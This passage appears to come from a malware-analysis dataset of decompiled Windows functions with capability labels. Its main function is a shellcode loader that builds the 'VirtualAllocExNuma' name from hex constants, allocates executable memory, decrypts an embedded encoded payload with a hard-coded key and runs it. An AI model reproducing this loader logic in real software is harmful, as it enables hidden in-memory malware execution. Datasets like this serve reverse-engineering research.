oqPY+IPCELhsvtzxKoM0MLOrwvyn/CkoTKvIveERJfJovddDUqM0eWA3CzLhUS3Et1jk0UnuZDdS4gGbGNmThU2HCuBxMfi5cWiVmUXQw3iByuM00HDrXV2jnWCD4VUj0JxAi1CpY55QiS5Sc5/LsWQxg1+YSY7gOCAgHhlYqjeIcCtAvNCwgDrKNzDy/Ojqa8E8/Ci2GMNdnjRUD8oJcmSF4IWYfKqLDWdUqUMeKdJ1CG0+EoGYN7LoIGTYgWjS+WFZy6W9U1GlUax6AGCCQ+CzpdUxAA15XqdcuKhZcetkrlGRNgL4vXEwGVFWsqKCOejfI+NSClC2CvFZnUsL8YmzCEAXCQCfpKvNxHAj4ZN5GAYovG5olUhMiHOKEyNdm7HRJek9W81wTU1bs3wOgtJB5QFrqjvKE1RkcSdfFVBxNHCxh1gvI1zjUTkjX2Nm2osy3/Uw5wj4EmjciL5BQWWWoiiBAeR+Zvhg4TS1aAzv2UshM7zCsrCHvIiw5eQzQ+l1d1mAQSvKm2YIZPiBE0FzZJUIWQ2pe4sxIhpmmWUQ3QtSUZ500TeZKOpAWRIQusr6L1BD9e0o+w5D+rEBQILIa38ZIqJ0vPmIgPlk7CltbLOT7LCL7USUgemT+WTpONPM6GHfzCBslVtA7ZsYiCZmCBO98NPwaT2BdNCIO0HcQDwiQViDp2Tw4POoqUjdSUHzddrQu+A5krHhOenbhNS0UWkgqrG4YooQCVlYlEzB2CA7MmxXXVlbD2knzEP4rTir4C4iI3icq4sYw7E+wqgIl\"\n    ;\n    puStack804 = &stack0xfffffd18;\n    uStack808 = 0x401dc9;\n    puStack804 = fcn.004028d0();\n    uStack688 = CONCAT31(uStack688._1_3_, 0x2b);\n    pcStack796 = *0x4295b4;\n    puStack800 = NULL;\n    uStack808 = 0x401de3;\n    fcn.004022b0();\n    uStack808 = 1;\n    pcStack700 = pcStack700 & 0xffffff00;\n    pcStack812 = 0x401df2;\n    fcn.004024b0();\n    puStack816 = &stack0xfffffcf8;\n    pcStack812 = \n    \"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\"\n    ;\n    puStack820 = &stack0xfffffd08;\n    uStack824 = 0x401e06;\n    puStack820 = fcn.004028d0();\n    uStack704 = CONCAT31(uStack704._1_3_, 0x2c);\n    pcStack812 = *0x4295b4;\n    puStack816 = NULL;\n    uStack824 = 0x401e20;\n    fcn.004022b0();\n    uStack824 = 1;\n    pcStack716 = pcStack716 & 0xffffff00;\n    fcn.004024b0();\n    uVar2 = fcn.004028d0(&stack0xfffffcf8, &stack0xfffffce8, \n                         \"DH19NESOvXh5inRkVjZU4wEgolqyttd6StdkgDjjLEjpUls04m/sVqJYtJDeAT5ifnzfuGAquD/GxnpEPza4roFtVhrXMPRuepFLVmRkLothCJDYIGHsUk+EVKZTKuLw5N7WBhYvhNBmf1ELTZB0c9jGIqMikHxdNESbbJtRUoQhwll6zHdkKndPXIGyDi79/Oe/OyzWowbYmwO4VKgUdkzyWvSFL5HsZNSsgWU2nJh2f4S2uCdmDAKBCC+wHThaIgnmMt7n1d5EB7gJwtoa3y4SSgYOL/NAilqLbBhRSCph2mU2dzoiSawq3qLpOEhUMufy8sw7PnR0UGa0zPoQVk9RVJEG8GBTCwu3Zkl1Kn3XVGtbguHUFa6YmN/l+uVgWzYeKpsUT5mUFZ1gOAN4DjrUTJTlIZQOSQ7M+nk41nmCciAVu0BthI4polZMBHJJNfgGMn16E1WalEOdKw87DvKQZnpnYDxgKzJ2NOM4BuZAZ+UBVCD0uMYuOAgrpXyQ7H/4AcBiO0wG2Ewgu/TaVjxIXJ5NNtMg\"\n                        );\n    uStack720 = CONCAT31(uStack720._1_3_, 0x2d);\n    fcn.004022b0(uVar2, 0, *0x4295b4);\n    pcStack732 = pcStack732 & 0xffffff00;\n    fcn.004024b0(1);\n    puStack820 = NULL;\n    uStack824 = 0;\n    iVar3 = puStack804;\n    if (puStack804 == NULL) {\n        iVar3 = 0x4295b0;\n    }\n    cVar1 = fcn.004011f0(&stack0xfffffccc, &stack0xfffffcc8, iVar3, puStack800);\n    if (cVar1 == '\\0') {\n        if (puStack804 == NULL) goto code_r0x00402062;\n        cVar1 = *(puStack804 + -1);\n        if ((cVar1 != '\\0') && (cVar1 != -1)) {\n            *(puStack804 + -1) = cVar1 + -1;\n            *in_FS_OFFSET = uStack744;\n            return;\n        }\n    }\n    else {\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        uVar5 = 0xffffffff;\n        pcVar8 = \"eGNkZg=\";\n        do {\n            if (uVar5 == 0) break;\n            uVar5 = uVar5 - 1;\n            cVar1 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar1 != '\\0');\n        pcStack812 = NULL;\n        puStack816 = NULL;\n        cVar1 = fcn.004011f0(&stack0xfffffcd4, &stack0xfffffcd0, \"eGNkZg=\", ~uVar5 - 1);\n        if (cVar1 == '\\0') {\n            pcStack764 = 0x4c0045;\n            puStack752 = 0x4c004c;\n            pcVar9 = NULL;\n            puStack772 = 0x45004b;\n            puStack768 = 0x4e0052;\n            uStack760 = 0x320033;\n            pcStack756 = \n            \"XDda0jqRkt2j9JilNqNstWUD0J1Z5ErBj7a+JPXSGDLfwDaZXDU+v6rQbw8+PK6o3l+VdelFEjxb4Nm38AFyGhBi3+cMnjx9bVBk/P6vayhtA0BscTjkdzQdG/l++Jz5T3+ojJAhua3ofE+bLK+K2+tiHRzMgtgs/YUy+U6VzZxU2bnhmqJqX5QPMHyV9BOnJw6o0Y9bqKEaEqpUl3ArK0XTxT9LK+8brlx56xkF+m/x3cQffSyfGa2Uy/D+WOzzGKKze9ex1grbxSNSsSj7NIz2t+c2zidyVSf74LsfmatFU93TYH8tCgOT7jlbeugepE4RwhrQtvmwEEKqDJrYVz0civb2/IB6iq/GFUMe/N3ENU1rik+O2trcEaOwpf0YOfmP4uNjiA/0mfngNLKjQXG/yeDdNc2OYnTNTmm8rrwdZ24jwTia1gB0N1bVrdqW6Nqc/ftQSOWaj8svPjIleGXK3j8c/P37y82i4Ak5IVoJ+3zUBI7z98UnvX4Mft3oOwpEASAomVQFmXlRrWsludC2GH221D928FZnUPY2kKP1ugXuT83dBvJGcURoeamtXkq16bm2Zfnb/Vmr0M6siyq3+tHjROyPzFI6sYZfWmlKBNCCS9AGc5tJNPqMGthNHy8OeajZvg4rgHxH5ASoBNUsTof+0eql9UjmCt31rYCmV29LG4o6mn86SeCw7K26qH/LY9crjO2pi+viHhYeOhQF59F8vLFYkFOMLLi+mCKyi1pKDe6uECedjzmwDC55vNhk4ZquGCItWInQPSv7BTNqU3E5gXiWUh6/GlrP69P/Lzwv6VUQkTj0tcoW9JKIUCE/VkrLA3BwwMYYDMMaCz2LWyF4eh/2SsQIC3vsTv97Z48F+YV7SfJeBjApxXycjfmbOV0FUQQR+Qvxwd6RQYmMgQGaAWX4hgdk7Bq2my50CTQ0Kd0McuJz6egj0axT0VBlQsrbTgXKLew+kWkHMtuWCBZW5frYL8sXuYIkdHum2Bw4XfEv0Cgw/Thpmjs+rOSAmnaOSdtP+SncOyeXnXVCO0akS1gDFcZ5mL4nMgnUBKbxlVv5UGvRV7dQrRLKnPhCjHGQh7LIrnwFLIjt+9m7l9Kb9Xu7CjjLBaw/UZT4QR3XNKThpfnXS1a4e7kcPmk9mc6NoQBusmEIxpMei1oRVmlEJDVWb2BRY7ucCcptG+x7ZzUp9IbNHf5HrPmETYDcXsdgCSQCU4zFxwOGnBervjwo89NbZTGLeOB+IK7pKWMYaizOnHoLoRxLIn75ACr5+csee1vY+z7C4y5Lj/J5CMB0AhrbQBbs+A79/d3X9P2lOnxZqp8KrPymDvr2Soe/EvoIAUQ50eID0eJPhe7W3gx/bVqekfSnfAao6JofyVviHQm3pm+LpJDeQU2nXKzaymU2oRjA6m5LrjYIM0CMkNzdn+KBHpjw84UMahHLznIZf70uOpjOAp5RtupgdRi/rs4KtXn5ffnPm8dOZ1JkLd9Vylp3qfFdUg1ak8GdOmvt323sHd2kkPW6jhbuuY0VPVjdf0z8fT1bSrPzpGRnHeX9FcggvtnZ6t81ve4lSHvU90fwMICi236f/aLoF1/6j0oZkQSlWyy+9fDRp/+aTPlPIGGKNe+7nq2fVjb7DSvVuNo/nOyS16czWexeJHut3Pbam2HybQ+cWbDy02pvfr1Vaz5wAb5glp3a7s1dGju+jN7GMf\"\n            ;\n            pcStack748 = pcStack748 & 0xffff0000;\n            uStack792 = 0x74726956;\n            puStack788 = 0x416c6175;\n            puStack784 = 0x636f6c6c;\n            pcStack780 = 0x754e7845;\n            uStack776 = uStack776 & 0xff000000 | 0x616d;\n            iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(&stack0xfffffcfc, 0, 0);\n            if (iVar3 != 0) {\n                pcVar9 = fcn.00401140(iVar3, &stack0xfffffcdc);\n            }\n            puVar6 = (*pcVar9)(uVar4, 0, uVar2, 0x3000, 0x40, 0);\n            puVar7 = puStack820;\n            puVar10 = puVar6;\n            for (uVar5 = uStack824 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n                *puVar10 = *puVar7;\n                puVar7 = puVar7 + 1;\n                puVar10 = puVar10 + 1;\n            }\n            for (uVar5 = uStack824 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n                *puVar10 = *puVar7;\n                puVar7 = puVar7 + 1;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        fcn.00401080(puVar6, uStack824, \"6#Rr?Mendit@dcvSAIz*fvsMFdDxIHhe~DPvjVPs3v|g2YX1{C2Tb%\", 0x36);\n        (*puVar6)();\n        if (puStack804 == NULL) goto code_r0x00402062;\n        cVar1 = *(puStack804 + -1);\n        if ((cVar1 != '\\0') && (cVar1 != -1)) {\n            *(puStack804 + -1) = cVar1 + -1;\n            *in_FS_OFFSET = uStack744;\n            return;\n        }\n    }\n    fcn.0041bd2d(puStack804 + -1);\ncode_r0x00402062:\n    *in_FS_OFFSET = uStack744;\n    return;\n}\n",
        "token_count": 77289
    },
    "004022b0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004022b0(int32_t param_1, int32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint unaff_EBX;\n    uint32_t uVar5;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint *puVar6;\n    uint unaff_EDI;\n    uint *puVar7;\n    uint32_t unaff_retaddr;\n    uint noname_1;\n    \n    if (*(param_2 + 8) < param_3) {\n        fcn.00415ea5();\n    }\n    uVar3 = *0x4295b4;\n    uVar5 = *(param_2 + 8) - param_3;\n    if (param_4 < uVar5) {\n        uVar5 = param_4;\n    }\n    if (param_1 == param_2) {\n        uVar5 = uVar5 + param_3;\n        if (*(param_1 + 8) < uVar5) {\n            fcn.00415ea5();\n        }\n        fcn.00402800();\n        uVar2 = *(param_1 + 8) - uVar5;\n        if (uVar2 < uVar3) {\n            uVar3 = uVar2;\n        }\n        if (uVar3 != 0) {\n            iVar4 = *(param_1 + 4) + uVar5;\n            fcn.0040b2d0(iVar4, iVar4 + uVar3, uVar2 - uVar3);\n            iVar4 = *(param_1 + 8) - uVar3;\n            param_3 = unaff_retaddr;\n            cVar1 = fcn.004025c0(iVar4, 0);\n            if (cVar1 != '\\0') {\n                *(param_1 + 8) = iVar4;\n                *(iVar4 + *(param_1 + 4)) = 0;\n            }\n        }\n        fcn.00402800();\n        uVar3 = *(param_1 + 8);\n        if (uVar3 < param_3) {\n            param_3 = uVar3;\n        }\n        if (param_3 == 0) {\n            return param_1;\n        }\n        fcn.0040b2d0(*(param_1 + 4), *(param_1 + 4) + param_3, uVar3 - param_3);\n        iVar4 = *(param_1 + 8) - param_3;\n        cVar1 = fcn.004025c0(iVar4, 0);\n        if (cVar1 == '\\0') {\n            return param_1;\n        }\n        fcn.004025a0(iVar4);\n        return param_1;\n    }\n    if ((uVar5 != 0) && (uVar5 == *(param_2 + 8))) {\n        iVar4 = *(param_2 + 4);\n        if (iVar4 == 0) {\n            iVar4 = 0x4295b0;\n        }\n        if (*(iVar4 + -1) < 0xfe) {\n            iVar4 = *(param_1 + 4);\n            if (iVar4 != 0) {\n                cVar1 = *(iVar4 + -1);\n                if ((cVar1 == '\\0') || (cVar1 == -1)) {\n                    fcn.0041bd2d(iVar4 + -1);\n                }\n                else {\n                    *(iVar4 + -1) = cVar1 + -1;\n                }\n            }\n            *(param_1 + 4) = 0;\n            *(param_1 + 8) = 0;\n            *(param_1 + 0xc) = 0;\n            iVar4 = *(param_2 + 4);\n            if (iVar4 == 0) {\n                iVar4 = 0x4295b0;\n            }\n            *(param_1 + 4) = iVar4;\n            *(param_1 + 8) = *(param_2 + 8);\n            *(param_1 + 0xc) = *(param_2 + 0xc);\n            *(iVar4 + -1) = *(iVar4 + -1) + '\\x01';\n            return param_1;\n        }\n    }\n    noname_1 = 0x402414;\n    uVar3 = fcn.004026e0();\n    if (uVar3 < uVar5) {\n        noname_1 = 0x40241d;\n        fcn.00415c79(unaff_EDI);\n    }\n    iVar4 = *(param_1 + 4);\n    if (((iVar4 == 0) || (cVar1 = *(iVar4 + -1),  cVar1 == '\\0')) || (cVar1 == -1)) {\n        if (uVar5 == 0) {\n            fcn.004024b0(1);\n            return param_1;\n        }\n        if ((*(param_1 + 0xc) < 0x20) && (uVar5 <= *(param_1 + 0xc))) goto code_r0x0040247c;\n        noname_1 = 1;\n        fcn.004024b0();\n    }\n    else if (uVar5 == 0) {\n        *(iVar4 + -1) = cVar1 + -1;\n        fcn.004024b0(0);\n        return param_1;\n    }\n    fcn.004026f0(uVar5, noname_1, unaff_EDI, unaff_ESI, unaff_EBP, unaff_EBX, unaff_retaddr, param_2, param_3, param_4);\ncode_r0x0040247c:\n    iVar4 = *(param_2 + 4);\n    if (iVar4 == 0) {\n        iVar4 = 0x4295b0;\n    }\n    puVar6 = param_3 + iVar4;\n    puVar7 = *(param_1 + 4);\n    for (uVar3 = uVar5 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar7 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    for (uVar3 = uVar5 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar7 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    *(param_1 + 8) = uVar5;\n    *(uVar5 + *(param_1 + 4)) = 0;\n    return param_1;\n}\n",
        "token_count": 1535
    },
    "00402500": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t __thiscall\nfcn.00402500(int32_t param_1, uint param_2, uint32_t param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *unaff_EBX;\n    uint unaff_EBP;\n    uint *puVar4;\n    uint unaff_retaddr;\n    uint in_stack_fffffff4;\n    \n    if (0xfffffffd < param_3) {\n        in_stack_fffffff4 = 0x402512;\n        fcn.00415c79(unaff_EBP);\n    }\n    iVar2 = *(param_1 + 4);\n    if (((iVar2 == 0) || (cVar1 = *(iVar2 + -1),  cVar1 == '\\0')) || (cVar1 == -1)) {\n        if (param_3 == 0) {\n            fcn.004024b0(1);\n            return param_1;\n        }\n        if ((*(param_1 + 0xc) < 0x20) && (param_3 <= *(param_1 + 0xc))) goto code_r0x00402570;\n        in_stack_fffffff4 = 1;\n        fcn.004024b0();\n    }\n    else if (param_3 == 0) {\n        *(iVar2 + -1) = cVar1 + -1;\n        *(param_1 + 4) = 0;\n        *(param_1 + 8) = 0;\n        *(param_1 + 0xc) = 0;\n        return param_1;\n    }\n    fcn.004026f0(param_3, in_stack_fffffff4, unaff_EBP, unaff_EBX, unaff_retaddr, param_2, param_3, param_4, param_5, \n                 param_6);\ncode_r0x00402570:\n    puVar4 = *(param_1 + 4);\n    for (uVar3 = param_3 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar4 = *unaff_EBX;\n        unaff_EBX = unaff_EBX + 1;\n        puVar4 = puVar4 + 1;\n    }\n    for (uVar3 = param_3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar4 = *unaff_EBX;\n        unaff_EBX = unaff_EBX + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *(param_1 + 8) = param_3;\n    *(param_3 + *(param_1 + 4)) = 0;\n    return param_1;\n}\n",
        "token_count": 629
    },
    "004026f0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004026f0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint *in_FS_OFFSET;\n    uint32_t var_8h;\n    uint var_10h;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x427d20;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    var_14h = var_8h | 0x1f;\n    if (0xfffffffd < var_14h) {\n        var_14h = var_8h;\n    }\n    iVar2 = var_14h + 2;\n    var_4h = 0;\n    if (iVar2 < 0) {\n        iVar2 = 0;\n    }\n    puVar3 = fcn.0041bd04(iVar2);\n    uVar5 = *(in_ECX + 8);\n    if (uVar5 != 0) {\n        if (var_14h < uVar5) {\n            uVar5 = var_14h;\n        }\n        puVar6 = *(in_ECX + 4);\n        puVar7 = puVar3 + 1;\n        for (uVar4 = uVar5 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar7 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 1;\n        }\n        for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar7 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 1;\n        }\n    }\n    iVar2 = *(in_ECX + 4);\n    uVar5 = *(in_ECX + 8);\n    if (iVar2 != 0) {\n        cVar1 = *(iVar2 + -1);\n        if ((cVar1 == '\\0') || (cVar1 == -1)) {\n            fcn.0041bd2d(iVar2 + -1);\n        }\n        else {\n            *(iVar2 + -1) = cVar1 + -1;\n        }\n    }\n    *(in_ECX + 8) = 0;\n    *(in_ECX + 4) = puVar3 + 1;\n    *puVar3 = 0;\n    *(in_ECX + 0xc) = var_14h;\n    if (uVar5 <= var_14h) {\n        var_14h = uVar5;\n    }\n    *(in_ECX + 8) = var_14h;\n    *(*(in_ECX + 4) + var_14h) = 0;\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 772
    },
    "00402800": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00402800(int32_t param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint *puVar5;\n    uint unaff_EDI;\n    uint *puVar6;\n    uint unaff_retaddr;\n    uint in_stack_ffffffec;\n    \n    puVar5 = *(param_1 + 4);\n    if (puVar5 == NULL) {\n        return;\n    }\n    cVar1 = *(puVar5 + -1);\n    if (cVar1 == '\\0') {\n        return;\n    }\n    if (cVar1 == -1) {\n        return;\n    }\n    *(puVar5 + -1) = cVar1 + -1;\n    uVar3 = 0xffffffff;\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0xc) = 0;\n    puVar6 = puVar5;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *puVar6;\n        puVar6 = puVar6 + 1;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3 - 1;\n    if (0xfffffffd < uVar3) {\n        in_stack_ffffffec = 0x40284e;\n        fcn.00415c79(unaff_EDI);\n    }\n    iVar2 = *(param_1 + 4);\n    if (((iVar2 == 0) || (cVar1 = *(iVar2 + -1),  cVar1 == '\\0')) || (cVar1 == -1)) {\n        if (uVar3 == 0) {\n            fcn.004024b0(1);\n            return;\n        }\n        if ((*(param_1 + 0xc) < 0x20) && (uVar3 <= *(param_1 + 0xc))) goto code_r0x004028a7;\n        in_stack_ffffffec = 1;\n        fcn.004024b0();\n    }\n    else if (uVar3 == 0) {\n        *(iVar2 + -1) = cVar1 + -1;\n        fcn.004024b0(0);\n        return;\n    }\n    fcn.004026f0(uVar3, in_stack_ffffffec, unaff_EDI, unaff_ESI, unaff_EBP, unaff_EBX, unaff_retaddr, param_2, param_3, \n                 param_4);\ncode_r0x004028a7:\n    puVar6 = *(param_1 + 4);\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    for (uVar4 = uVar3 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    *(param_1 + 8) = uVar3;\n    *(uVar3 + *(param_1 + 4)) = 0;\n    return;\n}\n",
        "token_count": 825
    },
    "004028d0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004028d0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    uint *unaff_retaddr;\n    uint uStack48;\n    int32_t iStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x427d38;\n    iStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack12;\n    uStack48 = *0x4295b4;\n    fcn.004022b0(param_2, 0);\n    uVar2 = 0xffffffff;\n    puVar4 = unaff_retaddr;\n    do {\n        if (uVar2 == 0) break;\n        uVar2 = uVar2 - 1;\n        cVar1 = *puVar4;\n        puVar4 = puVar4 + 1;\n    } while (cVar1 != '\\0');\n    uVar2 = ~uVar2 - 1;\n    if (0xfffffffe < uVar2) {\n        fcn.00415c79(param_2);\n    }\n    if (uVar2 != 0) {\n        cVar1 = fcn.004025c0(uVar2, 0);\n        if (cVar1 != '\\0') {\n            puVar4 = unaff_ESI + unaff_EDI;\n            for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar4 = *unaff_retaddr;\n                unaff_retaddr = unaff_retaddr + 1;\n                puVar4 = puVar4 + 1;\n            }\n            for (uVar3 = uVar2 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar4 = *unaff_retaddr;\n                unaff_retaddr = unaff_retaddr + 1;\n                puVar4 = puVar4 + 1;\n            }\n            *(unaff_EDI + uVar2) = 0;\n        }\n    }\n    pe_dos_header = uStack48._0_1_;\n    *0x4 = 0;\n    *0x8 = 0;\n    *0xc = 0;\n    fcn.004022b0(&uStack48, 0, *0x4295b4);\n    if (param_2 != 0) {\n        cVar1 = *(param_2 + -1);\n        if ((cVar1 != '\\0') && (cVar1 != -1)) {\n            *(param_2 + -1) = cVar1 + -1;\n            *in_FS_OFFSET = unaff_EDI;\n            return 0;\n        }\n        fcn.0041bd2d(param_2 + -1);\n    }\n    *in_FS_OFFSET = unaff_EDI;\n    return 0;\n}\n",
        "token_count": 710
    },
    "0040abe8": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040abe8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, double *arg_20h)\n\n{\n    bool bVar1;\n    double dVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_4h;\n    \n    if (9999 < arg_8h) {\n        return 0;\n    }\n    iVar4 = 1;\n    if (arg_ch == 0) {\n        return 0;\n    }\n    if (0xc < arg_ch) {\n        return 0;\n    }\n    if (((arg_8h & 3) == 0) && ((arg_8h % 100 != 0 || (arg_8h % 400 == 0)))) {\n        bVar1 = true;\n        if ((arg_10h == 0x1d) && (arg_ch == 2)) goto code_r0x0040ac5d;\n    }\n    else {\n        bVar1 = false;\n    }\n    iVar4 = 0;\n    if (arg_10h == 0) {\n        return 0;\n    }\ncode_r0x0040ac5d:\n    iVar3 = *(arg_ch * 4 + 0x449fe0);\n    if ((((arg_10h <= (iVar4 - iVar3) + *(arg_ch * 4 + 0x449fe4)) && (arg_14h < 0x18)) && (arg_18h < 0x3c)) &&\n       (arg_1ch < 0x3c)) {\n        uVar5 = arg_8h;\n        iVar3 = (((arg_8h >> 2) + uVar5 / 400 + uVar5 * 0x16d) - uVar5 / 100) + arg_10h + iVar3;\n        if ((arg_ch < 3) && (bVar1)) {\n            iVar3 = iVar3 + -1;\n        }\n        dVar2 = ((arg_14h * 0x3c + arg_18h) * 0x3c + arg_1ch) * *0x42b3f0;\n        if (iVar3 + -0xa96c7 < 0) {\n            dVar2 = -dVar2;\n        }\n      